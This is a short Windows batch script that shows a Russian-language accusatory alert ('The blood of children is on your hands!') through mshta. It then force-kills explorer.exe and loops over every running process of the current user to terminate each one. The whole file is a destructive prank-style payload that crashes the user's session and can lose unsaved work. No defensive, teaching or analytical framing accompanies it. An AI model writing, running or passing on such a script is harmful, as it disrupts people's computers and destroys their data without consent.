@chcp 65001
color 02
mshta "javascript:alert('Кровь детей на вашых руках!');close()"
taskkill /im explorer.exe /f >nul
for /f "tokens=1" %%i in ('tasklist /FI "USERNAME eq %USERNAME%" /FI "STATUS eq running" /NH') do (
    taskkill /f /im "%%i" >nul 2>&1
)